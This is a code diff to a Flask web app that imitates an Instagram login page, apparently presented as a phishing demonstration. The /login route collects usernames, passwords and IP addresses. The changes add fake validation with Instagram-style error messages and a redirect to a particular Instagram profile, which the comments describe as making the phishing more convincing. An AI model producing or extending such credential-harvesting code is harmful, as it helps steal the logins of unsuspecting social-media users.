@@ -218,12 +218,23 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    """Capture credentials and redirect to Instagram"""
-    username = request.form.get('username', '')
+    """Capture credentials with basic validation"""
+    username = request.form.get('username', '').strip()
     password = request.form.get('password', '')
     
-    # For phishing demonstration, we capture credentials but don't verify them
-    # The point is to show how easily data can be stolen, not to validate it
+    # Basic validation to make it realistic (like real Instagram)
+    # Instagram requires at least 6 characters for password
+    if not username:
+        return jsonify({
+            'status': 'error', 
+            'message': 'Please enter a username, email, or phone number.'
+        }), 400
+    
+    if len(password) < 6:
+        return jsonify({
+            'status': 'error', 
+            'message': 'Sorry, your password was incorrect. Please double-check your password.'
+        }), 401
     
     # Capture the data with timestamp
     data = {
@@ -246,8 +257,8 @@ def login():
     print(f"IP: {data['ip_address']}")
     print(f"{'='*60}\n")
     
-    # Always redirect to Instagram (makes the phishing more convincing)
-    instagram_url = "https://www.instagram.com/"
+    # Always redirect to specific Instagram profile (makes the phishing more convincing)
+    instagram_url = "https://www.instagram.com/ranjan.04__/"
     return jsonify({'status': 'success', 'redirect': instagram_url})
 
 @app.route('/reveal')
